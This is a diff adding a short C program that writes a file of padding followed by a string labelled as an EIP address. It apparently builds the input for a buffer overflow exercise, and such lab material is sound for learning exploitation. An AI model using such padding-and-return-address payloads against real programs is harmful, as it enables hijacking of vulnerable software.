@@ -1,0 +1,31 @@
+#include <stdio.h>
+#include <errno.h>
+#include <stdlib.h> 
+
+const char * addressEIP = "fffffc86";
+
+int main(void){
+	FILE *fp;
+  	int i;
+
+	fp = fopen("data3.txt","w");
+   
+   	if(fp == NULL){
+   		fprintf(stderr , "Error Opening The File \n");
+		exit(1);	
+    	}
+ 
+	
+	fprintf(fp,"Greg");       
+	
+	for(i=1;i<80;i++)
+		 putc (' ', fp);
+
+	fputs(addressEIP,fp);	
+
+        fclose(fp);
+	return 0;
+}
+	
+
+
